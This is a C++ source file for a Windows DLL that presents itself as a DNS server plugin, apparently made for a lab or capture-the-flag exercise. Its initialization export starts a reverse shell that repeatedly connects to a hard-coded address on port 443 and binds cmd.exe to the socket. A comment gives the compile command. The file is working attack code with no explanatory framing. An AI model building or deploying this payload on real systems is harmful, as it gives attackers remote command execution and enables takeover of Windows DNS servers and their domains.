#include <cstdio>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#include "DnsPlugin.h"

void RunShell(char* C2Server, int C2Port) {
	while(true) {
       		Sleep(5000);

	        SOCKET mySocket;
        	sockaddr_in addr;
	        WSADATA version;
        	WSAStartup(MAKEWORD(2,2), &version);
	        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        	addr.sin_family = AF_INET;

	        addr.sin_addr.s_addr = inet_addr(C2Server);
        	addr.sin_port = htons(C2Port);

	        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
        	    closesocket(mySocket);
	            WSACleanup();
        	    continue;
	        }
	        else {
        	    char RecvData[DEFAULT_BUFLEN];
	            memset(RecvData, 0, sizeof(RecvData));
        	    int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
	            if (RecvCode <= 0) {
        	        closesocket(mySocket);
                	WSACleanup();
	                continue;
        	    }
	            else {
        	        char Process[] = "cmd.exe";
                	STARTUPINFO sinfo;
	                PROCESS_INFORMATION pinfo;
        	        memset(&sinfo, 0, sizeof(sinfo));
                	sinfo.cb = sizeof(sinfo);
	                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        	        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                	CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
	                WaitForSingleObject(pinfo.hProcess, INFINITE);
        	        CloseHandle(pinfo.hProcess);
                	CloseHandle(pinfo.hThread);

	                memset(RecvData, 0, sizeof(RecvData));
        	        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                	if (RecvCode <= 0) {
	                    closesocket(mySocket);
        	            WSACleanup();
                	    continue;
	                }
        	        if (strcmp(RecvData, "exit\n") == 0) {
                	    exit(0);
	                }
		    }
		}
	}
}

int runExt(void) {
	// Change IP address and port and compile with:
	// user$ x86_64-w64-mingw32-gcc -shared -o DnsPlug.dll DnsPlug.cpp -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
	char host[] = "10.10.14.25";
        int port = 443;
        RunShell(host, port);
	return 0;
}

DNSPLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
    runExt();
    return 0;
}

DNSPLUGIN_API int DnsPluginCleanup(){
    return 0;
}

DNSPLUGIN_API int DnsPluginQuery(PVOID a1,PVOID a2,PVOID a3,PVOID a4){
    return 0;
}
